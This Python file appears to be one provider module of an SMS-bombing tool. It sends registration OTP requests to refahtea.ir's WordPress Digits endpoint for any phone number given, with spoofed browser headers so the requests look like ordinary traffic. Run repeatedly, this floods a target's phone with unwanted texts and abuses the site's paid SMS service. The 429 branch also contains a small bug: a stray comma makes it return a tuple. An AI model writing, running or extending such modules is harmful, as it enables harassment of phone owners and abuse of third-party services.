# Github : https://github.com/Bllare

import random
import time
from apis.sms.base import SmsProvider
from apis.status import SendStatus
import requests
from fake_headers import Headers
import uuid

class SmsRefahtea(SmsProvider):
    name = "SMS Refahtea"

    def send(self, phone: str) -> SendStatus:
        try:
            headers = Headers(browser="chrome",os="win",headers=True).generate()
            headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
            data =  f"digt_countrycode=%2B98&phone={int(phone)}&digits_process_register=1&sms_otp=&otp_step_1=1&digits_otp_field=1&instance_id=&optional_data=optional_data&action=digits_forms_ajax&type=register&dig_otp=sms_otp&digits=1&digits_redirect_page=%2F%2Frefahtea.ir%2F&digits_form=5019a03393&_wp_http_referer=%2F&otp_resend=true&container=digits_protected&sub_action=sms_otp"

            response = requests.post("https://refahtea.ir/wp-admin/admin-ajax.php", data=data, headers=headers)

            if response.status_code == 200:
                return SendStatus.SENT
            elif response.status_code == 429:
                return SendStatus.FAILED,
            else:
                return SendStatus.UNKNOWN
        except:
            return SendStatus.ERROR